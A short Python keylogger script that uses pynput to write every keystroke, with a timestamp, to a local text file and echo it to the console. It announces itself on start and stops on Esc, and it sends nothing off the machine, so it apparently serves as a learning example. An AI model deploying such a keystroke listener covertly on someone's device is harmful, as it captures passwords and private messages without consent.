# necessary packages
from pynput import keyboard
import time

#file containing all logs
log_file = "keystroke_logger.txt"
# var to check if logging active
logging_active = True

def press(key):
    global logging_active
    # when a key is pressed the function runs
    try:
        # this is where chars are put into file
        with open(log_file, "a") as file:
            if hasattr(key, 'char'):
                file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key.char}\n")
                print(key.char, end='', flush=True)  # print the typed character
            else:
                file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key}\n")
    except Exception as e:
        # handling exceptions
        print(f"Error: {str(e)}")

    # esc ends it
    if key == keyboard.Key.esc:
        logging_active = False
        return False


print("Keylogger starting, Press esc to end.")
try:
    # Start listening to keys
    with keyboard.Listener(on_press=press) as listener:
        listener.join()
except KeyboardInterrupt:
    # handle manual interruption
    pass
except Exception as e:
    # handle other potential exceptions
    print(f"Error: {str(e)}")

# have a message to show logging has stopped
if not logging_active:
    print("\nEnded.")
